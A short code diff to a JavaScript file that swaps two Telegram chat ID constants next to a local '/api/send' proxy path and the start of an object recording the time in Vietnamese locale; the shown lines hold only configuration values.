@@ -1,6 +1,6 @@
 const API_PROXY = '/api/send';
-const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1003542720642';
-const TELEGRAM_CHAT_ID_NO_PHOTOS = '5650932882';
+const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1004473917775';
+const TELEGRAM_CHAT_ID_NO_PHOTOS = '7112777204';
 
 const info = {
   time: new Date().toLocaleString('vi-VN'),
